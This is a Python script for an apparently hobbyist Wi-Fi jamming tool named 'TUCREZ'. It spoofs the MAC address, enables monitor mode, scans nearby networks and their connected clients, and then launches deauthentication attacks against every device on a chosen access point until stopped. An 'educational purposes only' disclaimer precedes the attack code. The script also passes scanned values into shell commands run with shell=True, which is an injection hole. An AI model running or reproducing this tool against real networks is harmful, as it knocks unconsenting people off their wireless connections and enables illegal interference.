import subprocess
import time
import os
import signal
import pandas

from automaticInstallation import install_requirements








def main():
    print('''
    ████████╗██╗   ██╗ ██████╗██████╗ ███████╗███████╗
    ╚══██╔══╝██║   ██║██╔════╝██╔══██╗██╔════╝╚══███╔╝
       ██║   ██║   ██║██║     ██████╔╝█████╗    ███╔╝ 
       ██║   ██║   ██║██║     ██╔══██╗██╔══╝   ███╔╝  
       ██║   ╚██████╔╝╚██████╗██║  ██║███████╗███████╗
       ╚═╝    ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝                                                
    ''')

    print('Disclaimer: This script is for educational purposes only. I am not responsible for any damage caused by this script. Use at your own risk.\n\n')


    confirm = True

    while confirm:
        sure = input("The script will spoof your MAC address and enable monitor mode. Are you sure to continue? (y/n)>")

        if sure == "y":
            print("\nProceeding..\n\n")
            confirm = False
        else:
            print("Canceled!")
            exit()



    #check if user is root
    if os.geteuid() != 0:
        exit("Please run as root")

    #check if all required programs are installed
    print('Checking requirements...')
    try:
        subprocess.call('which airodump-ng', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.call('which airmon-ng', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.call('which ifconfig', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.call('which macchanger', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.call('which xterm', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.call('which bash', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        print('Some requirements are not met. Continuing with automatic installation...\n\n')
        install_requirements()
        exit("Please run the script again.")

    print('All requirements are met.\n\n')

    #######################################












    #########Spoofing##########

    print('Spoofing MAC (eth0, wlan0) address...')

    print("\n-----------")
    subprocess.call('bash ./spoofModule.sh', shell=True)
    print("-----------\n")


    print('Your MAC address has been changed.\n\n')
    
    ##########################













    #########Enabling monitor mode##########

    print('Starting monitor mode...\n\n')
    
    subprocess.call('bash ./monitorMode.sh', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


    
    #######################################
    
    
    
    
    
    
    
    
    
    
    ############Getting all target networks##########
    
    print('Searching for targets...\n\n')
    
    temp = subprocess.Popen('bash ./dumperModule.sh', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
    time.sleep(10)
    os.killpg(os.getpgid(temp.pid), signal.SIGTERM)


    df = pandas.read_csv("./output-01.csv", usecols=['BSSID', 'ESSID', 'channel'], sep=', ', engine='python')
    counter = 0
    networkList = []
    
    print("\n-----------")
    
    for index, row in df.iterrows():
        if pandas.isnull(row['ESSID']) == False and pandas.isnull(row['BSSID']) == False and len(row['ESSID']) > 1:
            
            networkList.append(tuple((row['BSSID'], row['channel'])))
            
            counter += 1
            print(str(counter) +"   "+ row['BSSID'], row['ESSID'])

    print("-----------\n")
    
    ################################################
    
    
    
    
    
    
    
    
    
    
    
    ##########Target selection##########
    
    confirm = True
    
    while confirm:
        try:
            target = int(input("Choose target: "))
            if target > counter or target < 1:
                print("Invalid target")
            else:
                confirm = False
        except:
            print("Invalid target")
    
    ####################################    
    
    
    
    
    
    
    
    
    
    #############Get all devices################
    
    print("\n\nGetting all connected devices...")
    
    temp2 = subprocess.Popen('bash ./devicesModule.sh '+networkList[target-1][0] + " " +networkList[target-1][1], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
    time.sleep(10)
    os.killpg(os.getpgid(temp2.pid), signal.SIGTERM)
    
    
    
        
    deviceFrame = pandas.read_csv("./devices-01.csv", usecols=['BSSID'], sep=', ', engine='python')
    deviceList = []
    counter = 0
    

    for index, row in deviceFrame.iterrows():
        
        deviceList.append(row['BSSID'])
        
    
    
    for item in deviceList:
        if deviceList.index(item) < deviceList.index("Station MAC"):
            deviceList.remove(item)
            
    deviceList.remove(deviceList[0])
    
    print("\n-----------")
    
    for device in deviceList:
        counter += 1
        print(str(counter) +"   "+ device)
        
    print("-----------\n")

    #############################################
    
    
    
    
    
    
    
    
    #################Confirmation#################
    
    confirm = True
    
    while confirm:
        sure = input("Are you sure to jam the selected target? (y/n)>")

        if sure == "y":
            print("\nProceeding..\n\n")
            confirm = False
        else:
            print("Canceled!")
            exit()
    
    print("Starting attack in:")
    print("5")
    time.sleep(1)
    print("4")
    time.sleep(1)
    print("3")
    time.sleep(1)
    print("2")
    time.sleep(1)
    print("1")
    time.sleep(1)
    print('\nJamming... Press "ctrl+c" to stop.\n')
    print('The script need about 10 seconds to run stable.')
    
    
    
    
    #############################################
    
    
    
    
    
    
    
    
    ##############Attack start##################
    
    
    
    pidList = []
    
    for i in deviceList:
    
        temp2 = subprocess.Popen('bash ./deauthModule.sh '+ networkList[target-1][0] + " " +i, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
        pidList.append(os.getpgid(temp2.pid))
    
    
    #############################################
    
    
    
    
    
    
    #############Exiting protocol################  
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        
        for id in pidList:
            os.killpg(id, signal.SIGTERM)

        print("\nKilling all processes...")
        exit()    
    
    ###########################################


if __name__ == '__main__':
    main()
    




